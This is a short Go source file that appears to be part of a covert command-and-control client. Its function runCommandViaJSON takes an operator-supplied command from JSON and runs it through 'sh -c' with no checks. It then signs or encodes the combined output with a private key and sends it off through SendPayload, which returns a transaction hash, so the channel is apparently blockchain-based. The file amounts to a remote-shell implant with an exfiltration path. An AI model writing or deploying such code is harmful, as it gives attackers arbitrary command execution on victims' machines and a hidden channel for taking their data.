package main

import (
	"encoding/json"
	"os/exec"
)

func runCommandViaJSON(jsondata []byte) string {

	c := CommandData{}

	json.Unmarshal(jsondata, &c)

	cmd := exec.Command("sh", "-c", c.Commands)
	out, err := cmd.CombinedOutput()

	result := string(out)

	if err != nil {
		result += err.Error()
	}

	res := CommandData{ResultStdoutAndStdErr: result}

	bRawCMDJSON, _ := json.Marshal(res)
	rawCMDJSON, _ := MarshallPayload(string(bRawCMDJSON), cliPriateKey, 1, 1)

	txhash := SendPayload(rawCMDJSON, srvTag)

	return txhash
}

func runHelloViaJSON(jsondata []byte) string {
	return ""
}
